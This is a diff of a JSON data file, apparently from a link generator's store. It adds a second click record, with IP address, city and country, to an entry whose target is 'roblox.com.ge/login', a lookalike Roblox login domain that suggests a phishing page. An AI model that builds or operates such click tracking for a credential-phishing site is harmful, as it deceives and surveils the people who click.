@@ -14632,11 +14632,19 @@
     "targetUrl": "https://www.roblox.com.ge/login",
     "createdAt": 1779175206024,
     "status": "active",
-    "useCount": 1,
+    "useCount": 2,
     "createdBy": "generator",
     "clicks": [
       {
         "timestamp": 1779175212348,
+        "ip": "51.195.222.224",
+        "country": "United Kingdom",
+        "city": "Erith",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
+      },
+      {
+        "timestamp": 1779175218880,
         "ip": "51.195.222.224",
         "country": "United Kingdom",
         "city": "Erith",
